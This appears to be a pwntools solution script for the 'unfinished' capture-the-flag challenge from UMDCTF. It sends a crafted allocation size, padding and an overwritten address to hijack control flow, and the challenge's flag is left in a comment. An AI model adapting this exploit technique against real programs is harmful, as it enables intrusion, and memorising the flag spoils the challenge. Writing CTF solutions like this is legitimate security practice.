from pwn import *

context.arch = 'amd64'
context.log_level = 'debug'
context.terminal = ['tmux', 'splitw', '-h']

p = gdb.debug('./unfinished', '''
    b *(main+108)
    b *(main+165)
    continue
''')

# p = remote('challs.umdctf.io', 31003)

p.recvuntil(b'What size allocation?\n')
payload = str(0x1ffffffffffffffe).encode()
payload += b'A'*(0x41f128-0x41f060-len(payload))
payload += p64(0x4019b6)
p.sendline(payload)

p.interactive()

# UMDCTF{crap_i_have_to_come_up_with_a_flag_too?????????}